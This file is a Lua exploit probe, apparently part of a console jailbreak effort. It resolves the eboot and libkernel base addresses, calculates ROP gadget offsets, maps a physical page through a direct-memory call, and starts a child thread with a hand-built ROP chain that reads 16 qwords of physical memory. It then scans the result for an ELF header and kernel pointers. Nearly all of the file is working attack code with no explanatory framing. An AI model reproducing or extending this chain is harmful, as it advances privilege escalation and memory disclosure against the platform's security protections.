-- CRASH_CLASS: MODERATE
-- PROBE 562a: Single physical memory read — minimal, robust output
--
-- 561e proved the sentinel works (DEADFACE found in binary output).
-- But MapDM debug output ("77" + binary) corrupts the text stream.
-- This probe: ONE read, collect results in buffer, print AFTER all
-- MapDM/thr_new calls are done. Use simple hex format.

print("=== PROBE 562a: SINGLE PHYS READ ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rb(a)
    local d = rd(a); if d == nil then return nil end
    if d < 0 then d = d + 0x100000000 end; return d
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function zero(buf, n)
    for off = 0, n-4, 4 do
        pcall(function() memory.write_dword(buf + off, 0) end)
    end
end

local Z = uint64(0)
local sc20  = mk(20)
local sc73  = mk(73)
local sc477 = mk(477)
local sc455 = mk(455)
local sc593 = mk(593)

local pid = N(sc20())
print("pid=" .. pid)

-- Get eboot base
local info = memory.alloc(0x200)
zero(info, 0x200)
wd(info, 0x160)
pcall(function() sc593(Z, info) end)
local eb_lo = rd(info + 0x108) or 0
local eb_hi = rd(info + 0x10C) or 0
if eb_lo < 0 then eb_lo = eb_lo + 0x100000000 end
if eb_hi < 0 then eb_hi = eb_hi + 0x100000000 end
local eboot = uint64(string.format("0x%X%08X", eb_hi, eb_lo))
print(string.format("eboot=0x%X%08X", eb_hi, eb_lo))

-- Get libkernel base
zero(info, 0x200)
wd(info, 0x160)
pcall(function() sc593(uint64(0x2001), info) end)
local lk_lo = rd(info + 0x108) or 0
local lk_hi = rd(info + 0x10C) or 0
if lk_lo < 0 then lk_lo = lk_lo + 0x100000000 end
if lk_hi < 0 then lk_hi = lk_hi + 0x100000000 end
local lk = uint64(string.format("0x%X%08X", lk_hi, lk_lo))
local mapdm_fn = lk + uint64(0x15020)
print(string.format("lk=0x%X%08X", lk_hi, lk_lo))

-- Gadgets
local pop_rsi_ret     = eboot + uint64(0xD77D)
local pop_rdi_ret     = eboot + uint64(0xC9DFE)
local pop_rax_ret     = eboot + uint64(0x992)
local mov_rax_mem_rsi = eboot + uint64(0x1A5CC4)
local mov_mem_rdi_rax = eboot + uint64(0x92C67)
local bare_ret        = eboot + uint64(0x42)

print("gadgets OK")
io.flush()

-- ============================================================
-- STEP 1: MapDM physical page (produces "77" debug output)
-- ============================================================
local mapped_va = uint64("0x880000000")

-- Test: phys 0x100000000 (4GB — outside GPU pool, likely has data)
local phys = uint64("0x100000000")

pcall(function()
    sc477(mapped_va, uint64(0x4000), uint64(3),
        uint64(0x1012), uint64(0xFFFFFFFF), Z)
end)

local ok_md, rv_md = pcall(function()
    return native.fcall_with_rax(mapdm_fn, 0,
        mapped_va, uint64(0x4000), uint64(3), Z, phys, uint64(0x4000))
end)
local md_rv = ok_md and N(rv_md) or -999

-- ============================================================
-- STEP 2: Spawn child thread to read 16 qwords
-- ============================================================
local shared = memory.alloc(0x400)
zero(shared, 0x400)

local ss = 0x4000
local ok_stk, sb = pcall(function()
    return sc477(Z, uint64(ss), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), Z)
end)

local nq = 16
local sb_n = N(sb)
local top = sb_n + ss
local rsp_n = top - (top % 16) - 8
local rsp = sb + uint64(rsp_n - sb_n)

local ci = 0
local function wc(val)
    wq(rsp + uint64(ci * 8), val)
    ci = ci + 1
end

for qi = 0, nq - 1 do
    wc(pop_rsi_ret)
    wc(mapped_va + uint64(qi * 8))
    wc(mov_rax_mem_rsi)
    wc(pop_rdi_ret)
    wc(shared + uint64(8 + qi * 8))
    wc(mov_mem_rdi_rax)
end

wc(pop_rax_ret)
wc(uint64("0xDEADFACE"))
wc(pop_rdi_ret)
wc(shared)
wc(mov_mem_rdi_rax)

for i = 1, 32 do wc(bare_ret) end

local pa = memory.alloc(0x40)
zero(pa, 0x40)
wq(pa + 0x00, bare_ret)
wq(pa + 0x08, Z)
wq(pa + 0x10, uint64(sb))
wq(pa + 0x18, uint64(ss))
local tid_buf = memory.alloc(8)
wq(tid_buf, Z)
wq(pa + 0x30, uint64(tid_buf))

local ok_t, rv_t = pcall(function()
    return sc455(uint64(pa), uint64(0x38))
end)
local trv = ok_t and N(rv_t) or -999

-- ============================================================
-- STEP 3: Wait for sentinel
-- ============================================================
local sentinel = 0
for wait = 1, 5000 do
    for j = 1, 200 do local x = j * j end
    sentinel = rb(shared) or 0
    if sentinel == 0xDEADFACE then break end
end

-- ============================================================
-- STEP 4: Read all results into Lua table BEFORE any output
-- ============================================================
local results = {}
local sentinel_hi = rb(shared + 4) or 0
results.sentinel_lo = sentinel
results.sentinel_hi = sentinel_hi
results.mapdm_rv = md_rv
results.thr_rv = trv
results.qwords = {}

if sentinel == 0xDEADFACE then
    for qi = 0, nq - 1 do
        local lo = rb(shared + 8 + qi * 8) or 0
        local hi = rb(shared + 8 + qi * 8 + 4) or 0
        results.qwords[qi] = {hi, lo}
    end
end

-- Cleanup memory before printing
pcall(function() sc73(mapped_va, uint64(0x4000)) end)
pcall(function() sc73(sb, uint64(ss)) end)

-- ============================================================
-- STEP 5: ALL output happens here — after MapDM is done
-- ============================================================
print("")
print("========================================")
print("RESULTS (all MapDM/thread work done)")
print("========================================")
print(string.format("mapdm_rv=%d", results.mapdm_rv))
print(string.format("thr_new_rv=%d", results.thr_rv))
print(string.format("sentinel=0x%08X%08X", results.sentinel_hi, results.sentinel_lo))
print("")

if sentinel == 0xDEADFACE then
    print("CHILD THREAD READ PHYSICAL MEMORY!")
    print(string.format("phys=0x100000000 (4GB) — 16 qwords:"))
    for qi = 0, nq - 1 do
        local q = results.qwords[qi]
        if q then
            local tag = ""
            if qi == 0 and q[2] == 0x464C457F then tag = " *** ELF HEADER! ***" end
            if q[1] >= 0xFFFF8000 then tag = tag .. " KPTR?" end
            print(string.format("  [+%02X] %08X_%08X%s", qi*8, q[1], q[2], tag))
        end
    end
else
    print("TIMEOUT — sentinel not written")
    print(string.format("  sentinel raw: 0x%08X%08X", results.sentinel_hi, results.sentinel_lo))
end

print("")
local pid2 = N(sc20())
print("pid=" .. pid2 .. (pid2 == pid and " ALIVE" or " DEAD"))
print("=== 562a DONE ===")
